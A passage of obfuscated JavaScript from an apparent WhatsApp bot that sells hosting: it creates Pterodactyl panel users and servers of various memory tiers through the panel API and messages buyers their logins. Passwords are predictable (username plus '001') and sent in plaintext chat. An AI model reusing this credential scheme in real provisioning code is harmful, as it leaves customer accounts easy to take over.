          if (_0x5f574c.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x3af24b = _0x5f574c[0x0];
          let _0x44b4e9 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x5f574c[0x1] ? _0x5f574c[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x3f33ed = _0x3af24b + "1GB";
          let _0x42867c = global.eggsnya;
          let _0x5651d0 = global.location;
          let _0x1e4ec2 = _0x3af24b + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x44b4e9) {
            return;
          }
          let _0x394d08 = _0x3af24b + "001";
          let _0x1d7b53 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-TyPe': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1e4ec2,
              'username': _0x3af24b,
              'first_name': _0x3af24b,
              'last_name': _0x3af24b,
              'language': 'en',
              'password': _0x394d08
            })
          });
          let _0x5167f3 = await _0x1d7b53.json();
          if (_0x5167f3.errors) {
            return _0x427bb7(JSON.stringify(_0x5167f3.errors[0x0], null, 0x2));
          }
          let _0x37492d = _0x5167f3.attributes;
          let _0xd5715 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x42867c, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x37492d.id);
          ctf = "Hai @" + _0x44b4e9.split`@`[0x0] + "\n\n *👤USERNAME* : " + _0x37492d.username + "\n *🔐PASSWORD* : " + _0x394d08 + "\n *🌐LOGIN* : " + domain + "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n";
          _0x1acf89.sendMessage(_0x44b4e9, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x25764b = await _0xd5715.json();
          let _0x1376c3 = _0x25764b.attributes.startup;
          let _0xf14af7 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3f33ed,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x37492d.id,
              'egg': parseInt(_0x42867c),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1376c3,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "1024",
                'swap': 0x0,
                'disk': "1024",
                'io': 0x1f4,
                'cpu': '30'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x5651d0)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x1fb096 = await _0xf14af7.json();
          if (_0x1fb096.errors) {
            return _0x427bb7(JSON.stringify(_0x1fb096.errors[0x0], null, 0x2));
          }
        }
        break;
      case "2gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x5267a0 = _0x4ec028.split(',');
          if (_0x5267a0.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x358e0b = _0x5267a0[0x0];
          let _0xe27566 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x5267a0[0x1] ? _0x5267a0[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x2ab0bd = _0x358e0b + "2GB";
          let _0x4a9920 = global.eggsnya;
          let _0x15330e = global.location;
          let _0x5ec930 = _0x358e0b + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0xe27566) {
            return;
          }
          let _0x63304f = _0x358e0b + "001";
          let _0x480b22 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5ec930,
              'username': _0x358e0b,
              'first_name': _0x358e0b,
              'last_name': _0x358e0b,
              'language': 'en',
              'password': _0x63304f
            })
          });
          let _0x379c17 = await _0x480b22.json();
          if (_0x379c17.errors) {
            return _0x427bb7(JSON.stringify(_0x379c17.errors[0x0], null, 0x2));
          }
          let _0x50d623 = _0x379c17.attributes;
          let _0x239056 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4a9920, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x50d623.id);
          ctf = "Hai @" + _0xe27566.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x50d623.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x63304f + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : *6282291664759*\n=====================================\n";
          _0x1acf89.sendMessage(_0xe27566, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x380015 = await _0x239056.json();
          let _0x5e6543 = _0x380015.attributes.startup;
          let _0x54b932 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2ab0bd,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x50d623.id,
              'egg': parseInt(_0x4a9920),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x5e6543,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "2048",
                'swap': 0x0,
                'disk': "2048",
                'io': 0x1f4,
                'cpu': '60'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x15330e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2cdfe8 = await _0x54b932.json();
          if (_0x2cdfe8.errors) {
            return _0x427bb7(JSON.stringify(_0x2cdfe8.errors[0x0], null, 0x2));
          }
        }
        break;
      case "3gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x21bffc = _0x4ec028.split(',');
          if (_0x21bffc.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x2633a4 = _0x21bffc[0x0];
          let _0x5bf14a = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x21bffc[0x1] ? _0x21bffc[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x153080 = _0x2633a4 + "3GB";
          let _0x322324 = global.eggsnya;
          let _0x31a1ae = global.location;
          let _0x2e9471 = _0x2633a4 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x5bf14a) {
            return;
          }
          let _0x39d964 = _0x2633a4 + "001";
          let _0x37b9c0 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2e9471,
              'username': _0x2633a4,
              'first_name': _0x2633a4,
              'last_name': _0x2633a4,
              'language': 'en',
              'password': _0x39d964
            })
          });
          let _0x3e6942 = await _0x37b9c0.json();
          if (_0x3e6942.errors) {
            return _0x427bb7(JSON.stringify(_0x3e6942.errors[0x0], null, 0x2));
          }
          let _0x107813 = _0x3e6942.attributes;
          let _0x51a948 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x322324, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x107813.id);
          ctf = "Hai @" + _0x5bf14a.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x107813.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x39d964 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x5bf14a, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x57f5c3 = await _0x51a948.json();
          let _0x3fdd56 = _0x57f5c3.attributes.startup;
          let _0x16dd9f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x153080,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x107813.id,
              'egg': parseInt(_0x322324),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x3fdd56,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "3072",
                'swap': 0x0,
                'disk': "3072",
                'io': 0x1f4,
                'cpu': '80'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x31a1ae)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xd1e5e8 = await _0x16dd9f.json();
          if (_0xd1e5e8.errors) {
            return _0x427bb7(JSON.stringify(_0xd1e5e8.errors[0x0], null, 0x2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x5362a4 = _0x4ec028.split(',');
          if (_0x5362a4.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x492855 = _0x5362a4[0x0];
          let _0x26d2ef = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x5362a4[0x1] ? _0x5362a4[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x554bf7 = _0x492855 + '4';
          let _0x1d984d = global.eggsnya;
          let _0x284fff = global.location;
          let _0x1c24e7 = _0x492855 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x26d2ef) {
            return;
          }
          let _0x131d9b = _0x492855 + "001";
          let _0x32f20d = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1c24e7,
              'username': _0x492855,
              'first_name': _0x492855,
              'last_name': _0x492855,
              'language': 'en',
              'password': _0x131d9b
            })
          });
          let _0x1bd269 = await _0x32f20d.json();
          if (_0x1bd269.errors) {
            return _0x427bb7(JSON.stringify(_0x1bd269.errors[0x0], null, 0x2));
          }
          let _0x463b08 = _0x1bd269.attributes;
          let _0x15caf2 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1d984d, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x463b08.id);
          ctf = "Hai @" + _0x26d2ef.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x463b08.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x131d9b + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x26d2ef, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x24b687 = await _0x15caf2.json();
          let _0x349d75 = _0x24b687.attributes.startup;
          let _0x4d8c7c = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x554bf7,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x463b08.id,
              'egg': parseInt(_0x1d984d),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x349d75,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "4048",
                'swap': 0x0,
                'disk': "4000",
                'io': 0x1f4,
                'cpu': "100"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x284fff)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4d602b = await _0x4d8c7c.json();
          if (_0x4d602b.errors) {
            return _0x427bb7(JSON.stringify(_0x4d602b.errors[0x0], null, 0x2));
          }
        }
        break;
      case "unli":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7("𝐔𝐝𝐚𝐡 𝐁𝐢𝐬𝐚 𝐂𝐫𝐞𝐚𝐭𝐞 𝐒𝐚𝐦𝐩𝐞 𝟐𝟓𝐆𝐁, 𝐌𝐚𝐬𝐢 𝐍𝐠𝐞𝐥𝐮𝐧𝐣𝐚𝐤 𝐂𝐫𝐞𝐚𝐭𝐞 𝐔𝐧𝐥𝐢 🗿 !");
          }
          let _0x18c383 = _0x4ec028.split(',');
          if (_0x18c383.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x3c5dc5 = _0x18c383[0x0];
          let _0x4db4a4 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x18c383[0x1] ? _0x18c383[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x50f276 = _0x3c5dc5 + "Unli";
          let _0x56ee43 = global.eggsnya;
          let _0x18d715 = global.location;
          let _0x1121ed = _0x3c5dc5 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4db4a4) {
            return;
          }
          let _0x521b65 = _0x3c5dc5 + "001";
          let _0x2cdfa6 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1121ed,
              'username': _0x3c5dc5,
              'first_name': _0x3c5dc5,
              'last_name': _0x3c5dc5,
              'language': 'en',
              'password': _0x521b65
            })
          });
          let _0x4fb74e = await _0x2cdfa6.json();
          if (_0x4fb74e.errors) {
            return _0x427bb7(JSON.stringify(_0x4fb74e.errors[0x0], null, 0x2));
          }
          let _0x42d453 = _0x4fb74e.attributes;
          let _0x5cdf3a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x56ee43, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x42d453.id);
          ctf = "Hai @" + _0x4db4a4.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x42d453.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x521b65 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x4db4a4, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x59b7e0 = await _0x5cdf3a.json();
          let _0x171230 = _0x59b7e0.attributes.startup;
          let _0x577861 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x50f276,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x42d453.id,
              'egg': parseInt(_0x56ee43),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x171230,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '0',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '0'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x18d715)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x32a11e = await _0x577861.json();
          if (_0x32a11e.errors) {
            return _0x427bb7(JSON.stringify(_0x32a11e.errors[0x0], null, 0x2));
          }
        }
        break;
      case "5gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0xfd6e2b = _0x4ec028.split(',');
          if (_0xfd6e2b.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x4c0f25 = _0xfd6e2b[0x0];
          let _0x50fa7a = _0x470adc.quoted ? _0x470adc.quoted.sender : _0xfd6e2b[0x1] ? _0xfd6e2b[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x2fb999 = _0x4c0f25 + "5GB";
          let _0x2401d1 = global.eggsnya;
          let _0x1bc871 = global.location;
          let _0x4a2b00 = _0x4c0f25 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x50fa7a) {
            return;
          }
          let _0x2fc561 = _0x4c0f25 + "0011";
          let _0x5f000a = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4a2b00,
              'username': _0x4c0f25,
              'first_name': _0x4c0f25,
              'last_name': _0x4c0f25,
              'language': 'en',
              'password': _0x2fc561
            })
          });
          let _0x22da29 = await _0x5f000a.json();
          if (_0x22da29.errors) {
            return _0x427bb7(JSON.stringify(_0x22da29.errors[0x0], null, 0x2));
          }
          let _0x42fd5a = _0x22da29.attributes;
          let _0x530ef3 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2401d1, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x42fd5a.id);
          ctf = "Hai @" + _0x50fa7a.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x42fd5a.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x2fc561 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x50fa7a, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x1642d7 = await _0x530ef3.json();
          let _0x44e76b = _0x1642d7.attributes.startup;
          let _0x19b2c9 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2fb999,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x42fd5a.id,
              'egg': parseInt(_0x2401d1),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x44e76b,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "5138",
                'swap': 0x0,
                'disk': "5138",
                'io': 0x1f4,
                'cpu': "120"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1bc871)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x506da0 = await _0x19b2c9.json();
          if (_0x506da0.errors) {
            return _0x427bb7(JSON.stringify(_0x506da0.errors[0x0], null, 0x2));
          }
        }
        break;
      case "6gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x3a9ee7 = _0x4ec028.split(',');
          if (_0x3a9ee7.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x56c385 = _0x3a9ee7[0x0];
          let _0x3116b9 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x3a9ee7[0x1] ? _0x3a9ee7[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x4a27c8 = _0x56c385 + "6GB";
          let _0x2ee2ce = global.eggsnya;
          let _0x280210 = global.location;
          let _0x5c0763 = _0x56c385 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x3116b9) {
            return;
          }
          let _0x49adc9 = _0x56c385 + "0011";
          let _0x5e84c0 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5c0763,
              'username': _0x56c385,
              'first_name': _0x56c385,
              'last_name': _0x56c385,
              'language': 'en',
              'password': _0x49adc9
            })
          });
          let _0x1666b7 = await _0x5e84c0.json();
          if (_0x1666b7.errors) {
            return _0x427bb7(JSON.stringify(_0x1666b7.errors[0x0], null, 0x2));
          }
          let _0x375c32 = _0x1666b7.attributes;
          let _0x1fae29 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2ee2ce, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x375c32.id);
